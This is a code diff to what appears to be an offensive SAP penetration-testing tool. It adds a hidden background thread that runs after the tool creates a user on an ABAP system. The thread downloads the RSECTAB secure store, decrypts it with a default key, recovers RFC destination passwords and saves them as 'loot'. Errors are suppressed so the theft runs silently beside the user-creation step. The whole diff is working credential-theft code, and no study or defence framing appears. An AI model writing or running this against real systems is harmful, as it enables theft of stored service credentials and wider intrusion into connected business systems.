@@ -1124,6 +1124,68 @@ class SAPMAPState:
         except Exception:
             pass
 
+        # Implicit SecStore download — RSECTAB is the highest-value
+        # immediate-loot on an ABAP system, the just-created user
+        # typically has SAP_ALL, and operators routinely run this
+        # action right after every create-user.  Fire-and-forget on
+        # a daemon thread so the create-user flow itself isn't
+        # blocked by the RSECTAB read.
+        if node and "ABAP" in (node.system_type or "").upper():
+            self._auto_download_secstore_async(node)
+
+    def _auto_download_secstore_async(self, node) -> None:
+        """Trigger an implicit RSECTAB download on a background thread.
+
+        Skipped when this node already has secstore entries (avoid
+        duplicate work after multiple user-creation events on the
+        same node).  Failures never escape — the caller's create-user
+        flow continues regardless.
+        """
+        if getattr(node, "secstore_entries", None):
+            return  # already populated by a previous run
+        import threading as _t
+        def _run():
+            try:
+                from sapmap_findings import emit_finding
+                from sapmap_secstore import (
+                    download_and_decrypt, integrate_results, save_loot,
+                    DEFAULT_KEY_HEX,
+                )
+                from sapmap_state import ensure_loot_dir
+                creds = node.best_credentials()
+                if not creds:
+                    return
+                emit_finding(
+                    "INFO", node.sid,
+                    "Auto-downloading SecStore (RSECTAB) — triggered "
+                    "by user creation; this is the high-value loot "
+                    "operators always want first.",
+                    ref="secstore.auto.download.start")
+                print(f"[*] SecStore {node.sid} (auto): starting after "
+                      f"user creation — using best credentials")
+                results = download_and_decrypt(
+                    node, creds, DEFAULT_KEY_HEX, state=self)
+                integrate_results(node, self, results)
+                ok = [r for r in results
+                      if not r.get("error") and r.get("password")]
+                outfile = save_loot(node.sid, results,
+                                     ensure_loot_dir("secstore"))
+                print(f"[+] SecStore {node.sid} (auto): "
+                      f"{len(results)} entries, {len(ok)} decrypted "
+                      f"→ {outfile}")
+                if ok:
+                    emit_finding(
+                        "CRITICAL", node.sid,
+                        f"ABAP SecStore decrypted (auto-triggered "
+                        f"after user creation) — {len(ok)} RFC "
+                        f"destination password(s) recovered.",
+                        ref="secstore.auto.decrypted")
+            except Exception as e:
+                print(f"[-] SecStore {node.sid} (auto): failed "
+                      f"silently — {e}")
+        _t.Thread(target=_run, daemon=True,
+                   name=f"secstore-auto-{node.sid}").start()
+
     # -- RFC check cache --
 
     def is_rfc_checked(self, destination_name: str) -> bool:
